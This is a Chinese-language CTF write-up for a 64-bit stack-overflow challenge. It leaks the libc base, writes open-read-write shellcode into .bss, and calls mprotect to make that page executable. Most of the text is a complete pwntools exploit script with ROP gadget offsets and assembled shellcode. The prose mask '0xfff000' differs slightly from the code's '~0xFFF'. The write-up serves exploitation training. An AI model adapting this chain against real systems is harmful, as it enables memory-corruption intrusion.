# week3pwn2

## 题目简述

64 位程序存在与 pwn1 相同偏移的栈溢出，但本题利用目标是把 ORW Shellcode 写入 `.bss`，再用 `mprotect` 将所在页改成可执行并跳转。由于 NX 默认禁止执行数据段，需要先泄露 libc 以取得 `syscall` 和寄存器 gadget。

## 解题过程

第一阶段仍用 `puts(puts@got)` 泄露 glibc 2.31 基址并返回 `main`。第二阶段通过 `read(0, bss, 0x100)` 把 Shellcode 写入可写区；第三阶段调用 `mprotect(bss_page, 0x1000, 7)` 赋予 `RWX` 权限，然后以 `.bss` 地址作为返回地址。Shellcode 自行打开 `./flag`、读取 32 字节并写到标准输出。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
HOST = 'challenge-host'
PORT = 8002
s = remote(HOST, PORT)
elf = ELF('./pwn2')
libc = ELF('./libc-2.31.so')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x401303
bss_addr = 0x404088
pop_rdi_ret = 0x00000000004013b3
ret = 0x000000000040101a

payload = (
    b'a' * 0x20 + b'b' * 0x8 +
    p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
)
s.sendlineafter(b'try to find difference\n', payload)
libc_base = u64(s.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))

syscall_ret = libc_base + 0x00000000000630a9
pop_rax_ret = libc_base + 0x0000000000036174
pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_ret = libc_base + 0x0000000000142c92

payload = b'a' * 0x20 + b'b' * 0x8
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(bss_addr) + p64(pop_rdx_ret) + p64(0x100) + p64(pop_rax_ret) + p64(0) + p64(syscall_ret) + p64(main)
s.sendlineafter(b'try to find difference\n', payload)

shellcode = asm('''
    mov rdi, 0x67616c662f2e
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 32
    xor rax, rax
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 32
    push 1
    pop rax
    syscall
''')
sleep(1)
s.send(shellcode)

bss_page = bss_addr & ~0xFFF
payload = b'a' * 0x20 + b'b' * 0x8
payload += p64(pop_rdi_ret) + p64(bss_page) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_ret) + p64(7) + p64(pop_rax_ret) + p64(0xa) + p64(syscall_ret) + p64(bss_addr)
s.sendafter(b'try to find difference\n', payload)
s.interactive()
```

## 方法总结

利用链是“泄露 libc → 写入 Shellcode → `mprotect` 解除 NX → 跳转执行”。`mprotect` 的首参必须按页对齐，因此脚本使用 `bss_addr & 0xfff000`；权限值 7 是 `PROT_READ|PROT_WRITE|PROT_EXEC`。Shellcode 中压栈的整数 `0x67616c662f2e` 按小端序形成 `./flag\0\0`。旧 IP 已去除，运行时只需填写当前 `HOST/PORT`，其余偏移仍应与附件二进制和 libc 一致。
